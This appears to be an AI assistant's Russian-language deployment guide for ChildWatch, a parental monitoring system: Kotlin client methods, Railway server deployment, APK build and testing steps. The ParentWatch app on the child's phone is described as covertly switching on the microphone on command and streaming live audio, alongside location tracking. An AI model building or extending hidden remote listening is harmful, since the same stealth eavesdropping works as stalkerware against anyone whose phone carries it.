# 🚀 Руководство по Развертыванию ChildWatch v3.2.0

## 📦 ЧТО ГОТОВО

### ✅ Серверная часть (100%)
- CommandManager для управления командами
- API для аудио-стриминга
- Буферизация аудио-чанков
- Конфигурация для Railway

### ✅ ParentWatch (телефон ребенка) (100%)
- NetworkHelper с методами streaming API
- AudioStreamRecorder для записи и загрузки чанков
- LocationService с проверкой команд каждые 30 сек
- Автоматическая скрытная активация микрофона

### ⚠️ ChildWatch (телефон родителя) (75%)
- NetworkClient методы **ТРЕБУЮТ ДОРАБОТКИ**
- AudioActivity UI **ТРЕБУЕТ ДОРАБОТКИ**
- Воспроизведение аудио **ТРЕБУЕТСЯ РЕАЛИЗОВАТЬ**

---

## 🎯 ЧТО НУЖНО СДЕЛАТЬ ВРУЧНУЮ

### 1. Доработка ChildWatch (приоритет - ВЫСОКИЙ)

Я не могу полностью доработать ChildWatch из-за ограничений. Вам нужно:

#### A) Добавить методы в NetworkClient.kt

Откройте: `app/src/main/java/ru/example/childwatch/network/NetworkClient.kt`

Добавьте методы:

```kotlin
/**
 * Start audio streaming
 */
suspend fun startAudioStream(deviceId: String): Response {
    return withContext(Dispatchers.IO) {
        try {
            val url = "$baseUrl/api/streaming/start"

            val jsonData = JSONObject().apply {
                put("deviceId", deviceId)
                put("parentId", "parent-001")
            }

            val requestBody = jsonData.toString()
                .toRequestBody("application/json".toMediaType())

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                Response(
                    success = response.isSuccessful,
                    message = if (response.isSuccessful) "Streaming started" else "Failed",
                    data = null
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Start streaming error", e)
            Response(false, e.message ?: "Error", null)
        }
    }
}

/**
 * Stop audio streaming
 */
suspend fun stopAudioStream(deviceId: String): Response {
    return withContext(Dispatchers.IO) {
        try {
            val url = "$baseUrl/api/streaming/stop"

            val jsonData = JSONObject().apply {
                put("deviceId", deviceId)
            }

            val requestBody = jsonData.toString()
                .toRequestBody("application/json".toMediaType())

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                Response(
                    success = response.isSuccessful,
                    message = if (response.isSuccessful) "Streaming stopped" else "Failed",
                    data = null
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Stop streaming error", e)
            Response(false, e.message ?: "Error", null)
        }
    }
}

/**
 * Start recording during streaming
 */
suspend fun startRecording(deviceId: String): Response {
    return withContext(Dispatchers.IO) {
        try {
            val url = "$baseUrl/api/streaming/record/start"

            val jsonData = JSONObject().apply {
                put("deviceId", deviceId)
            }

            val requestBody = jsonData.toString()
                .toRequestBody("application/json".toMediaType())

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                Response(
                    success = response.isSuccessful,
                    message = if (response.isSuccessful) "Recording started" else "Failed",
                    data = null
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Start recording error", e)
            Response(false, e.message ?: "Error", null)
        }
    }
}

/**
 * Stop recording
 */
suspend fun stopRecording(deviceId: String): Response {
    return withContext(Dispatchers.IO) {
        try {
            val url = "$baseUrl/api/streaming/record/stop"

            val jsonData = JSONObject().apply {
                put("deviceId", deviceId)
            }

            val requestBody = jsonData.toString()
                .toRequestBody("application/json".toMediaType())

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                Response(
                    success = response.isSuccessful,
                    message = if (response.isSuccessful) "Recording stopped" else "Failed",
                    data = null
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Stop recording error", e)
            Response(false, e.message ?: "Error", null)
        }
    }
}

/**
 * Get audio chunks for streaming playback
 */
suspend fun getAudioChunks(deviceId: String, count: Int = 5): List<AudioChunk> {
    return withContext(Dispatchers.IO) {
        try {
            val url = "$baseUrl/api/streaming/chunks/$deviceId?count=$count"

            val request = Request.Builder()
                .url(url)
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "{}")
                    val chunksArray = json.optJSONArray("chunks")
                    val chunks = mutableListOf<AudioChunk>()

                    if (chunksArray != null) {
                        for (i in 0 until chunksArray.length()) {
                            val chunkObj = chunksArray.getJSONObject(i)
                            chunks.add(
                                AudioChunk(
                                    data = chunkObj.getString("data"),
                                    timestamp = chunkObj.getLong("timestamp")
                                )
                            )
                        }
                    }

                    return@withContext chunks
                }
                return@withContext emptyList()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Get chunks error", e)
            return@withContext emptyList()
        }
    }
}

// Data class for audio chunk
data class AudioChunk(
    val data: String, // Base64 encoded
    val timestamp: Long
)
```

#### B) Обновить AudioActivity.kt

Текущий AudioActivity только показывает UI. Нужно:

1. **Добавить кнопки управления**
2. **Реализовать логику прослушки**
3. **Добавить воспроизведение аудио**

Это большой объем работы. Рекомендую:
- Оставить текущую запись как есть
- Добавить отдельную кнопку "Прослушка в реальном времени"
- Временно пропустить сложную реализацию AudioTrack

---

## 2. Облачный Деплой (Railway)

### Шаг 1: Подготовка

```bash
cd C:\Users\dr-ed\ChildWatch\server
```

Убедитесь что `package.json` содержит:

```json
{
  "scripts": {
    "start": "node index.js",
    "dev": "nodemon index.js"
  }
}
```

### Шаг 2: Git репозиторий

```bash
# Инициализируйте git в папке server (если еще не сделано)
git init
git add .
git commit -m "ChildWatch Server v1.1.0 with streaming"

# Создайте репозиторий на GitHub
# Назовите его: childwatch-server

# Добавьте remote и push
git remote add origin https://github.com/ВАШ_USERNAME/childwatch-server.git
git branch -M main
git push -u origin main
```

### Шаг 3: Railway.app

1. Перейдите на [railway.app](https://railway.app)
2. Sign up / Login (можно через GitHub)
3. **New Project** → **Deploy from GitHub repo**
4. Выберите репозиторий `childwatch-server`
5. Railway автоматически обнаружит Node.js проект
6. Нажмите **Deploy**

### Шаг 4: Получите URL

После деплоя Railway покажет:
```
https://childwatch-production-XXXX.up.railway.app
```

Скопируйте этот URL!

### Шаг 5: Обновите приложения

**ParentWatch:**
1. Запустите приложение
2. В поле "URL сервера" введите: `https://childwatch-production-XXXX.up.railway.app`
3. Нажмите "ЗАПУСТИТЬ МОНИТОРИНГ"

**ChildWatch:**
1. Настройки → URL сервера → введите тот же URL
2. Сохраните

---

## 3. Сборка APK v3.2.0

После всех изменений:

```bash
cd C:\Users\dr-ed\ChildWatch
./gradlew.bat assembleDebug
```

APK будут в:
```
app/build/outputs/apk/debug/ChildWatch-v3.1.0-debug.apk
parentwatch/build/outputs/apk/debug/ParentWatch-v3.1.0-debug.apk
```

**Версия пока 3.1.0** - обновите до 3.2.0 в `build.gradle` если доработаете ChildWatch.

---

## 4. Тестирование

### Минимальный MVP (что работает СЕЙЧАС):

✅ **Геолокация:**
- ParentWatch отправляет координаты каждые 30 сек
- ChildWatch показывает на карте

✅ **Проверка команд:**
- ParentWatch проверяет команды каждые 30 сек
- Готов включить микрофон по команде

⚠️ **Прослушка:**
- Серверная часть готова
- ParentWatch готов стримить аудио
- ChildWatch **НЕ МОЖЕТ** отправить команду (нужна доработка)

### Полноценное тестирование (после доработки):

1. **Запустите сервер на Railway**
2. **Установите оба APK на разные телефоны**
3. **ParentWatch:** Запустить мониторинг
4. **ChildWatch:** Открыть "Прослушка" → Начать прослушку
5. **Проверить:** Микрофон включился на телефоне ребенка
6. **Проверить:** Родитель слышит аудио

---

## 5. Возможные проблемы

### Проблема: "Failed to register device"
**Решение:** Проверьте URL сервера, он должен быть доступен из интернета

### Проблема: "Permission denied" для микрофона
**Решение:** В ParentWatch вручную дайте разрешение RECORD_AUDIO в настройках Android

### Проблема: Прослушка не запускается
**Решение:**
1. Проверьте логи сервера на Railway
2. Убедитесь что device ID правильный
3. Проверьте что ParentWatch проверяет команды (должно быть в логах)

---

## 📊 Статус проекта

### Что ПОЛНОСТЬЮ работает:
- ✅ Регистрация устройств
- ✅ Отправка геолокации
- ✅ Отображение на карте
- ✅ Серверная часть для стриминга
- ✅ ParentWatch - проверка команд и запись аудио

### Что требует доработки:
- ⚠️ ChildWatch NetworkClient методы (простая задача - копировать код выше)
- ⚠️ ChildWatch AudioActivity UI и логика (средняя сложность)
- ⚠️ Воспроизведение аудио в реальном времени (сложная задача)

### Рекомендуемый план:
1. **Сейчас:** Задеплойте сервер на Railway
2. **Сегодня:** Добавьте методы в NetworkClient (15 минут)
3. **Завтра:** Доработайте AudioActivity (1-2 часа)
4. **Позже:** Оптимизируйте воспроизведение аудио

---

## 🆘 Нужна помощь?

**Если что-то не получается:**
1. Проверьте логи сервера на Railway
2. Проверьте logcat на Android (`adb logcat -s ParentWatch:D`)
3. Посмотрите [AUDIO_STREAMING_README.md](AUDIO_STREAMING_README.md) для деталей

**Файлы для справки:**
- Серверная архитектура: `server/managers/CommandManager.js`
- API роуты: `server/routes/streaming.js`
- ParentWatch: `parentwatch/src/main/java/ru/example/parentwatch/service/LocationService.kt`
- ChildWatch: `app/src/main/java/ru/example/childwatch/AudioActivity.kt`

Удачи! 🚀
